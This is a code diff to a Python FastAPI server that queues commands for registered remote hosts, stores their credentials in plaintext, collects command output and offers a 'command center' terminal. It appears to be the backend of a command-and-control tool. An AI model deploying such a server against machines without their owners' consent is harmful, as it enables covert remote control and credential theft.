@@ -104,11 +104,27 @@ async def add_command(connection_id: str, command: str):
 
     return {"message": "Command added to queue"}
 
+# return the new commands for the client from the database based on the connection ID
+@app.get('/commands/{connection_id}')
+async def get_commands(connection_id: str):
+    # retrieve the connection from the database
+    connection = connections.find_one({"_id": ObjectId(connection_id)})
+    if not connection:
+        raise HTTPException(status_code=404, detail="Connection not found")
+
+    # retrieve the commands from the database
+    commands = connection["commands"]
+
+    # clear the commands from the database
+    connections.update_one({"_id": connection_id}, {"$set": {"commands": []}})
+
+    return {"commands": commands}
+
 # get a list of all commands for one connection from the database to be displayed in the web interface
 @app.get('/command-list/{connection_id}')
-async def get_command_list(connection_id: str):
+async def get_command_list(connection_id):
     # retrieve the connection from the database
-    connection = connections.find_one({"_id": connection_id})
+    connection = connections.find_one({"_id": ObjectId(connection_id)})
     if not connection:
         raise HTTPException(status_code=404, detail="Connection not found")
 
@@ -130,10 +146,9 @@ async def command_center(request: Request):
 
     return templates.TemplateResponse('command_center.html', {'request': request, 'connection_list': connection_list})
 
-
 # "terminal" or command center route
 @app.get("/command-center/terminal/{connection_id}")
-async def terminal(request: Request, connection_id: str):
+async def terminal(request: Request, connection_id):
     # retrieve the connection from the database
     connection = connections.find_one({"_id": ObjectId(connection_id)})
     if not connection:
@@ -155,6 +170,7 @@ async def register_connection(os_type: str, ip_address: str, hostname: str, user
     if password == "": password = None
     # store the connection in the database
     connection_id = connections.insert_one({"os_type": os_type, "ip_address": ip_address, "hostname": hostname, "username": username, "password": password, "commands": [], "output": ""}).inserted_id
+    print("Connection registered: " + str(connection_id))
     return {"id": str(connection_id)}
     
 # unregister a connection
@@ -173,22 +189,6 @@ async def get_connection_details(connection_id: str):
         raise HTTPException(status_code=404, detail="Connection not found")
 
     return connection
-
-# return the new commands for the client from the database based on the connection ID
-@app.get('/commands/{connection_id}')
-async def get_commands(connection_id: str):
-    # retrieve the connection from the database
-    connection = connections.find_one({"_id": connection_id})
-    if not connection:
-        raise HTTPException(status_code=404, detail="Connection not found")
-
-    # retrieve the commands from the database
-    commands = connection["commands"]
-
-    # clear the commands from the database
-    connections.update_one({"_id": connection_id}, {"$set": {"commands": []}})
-
-    return {"commands": commands}
 
 # add the output of the command to the database
 @app.post('/output/{connection_id}')
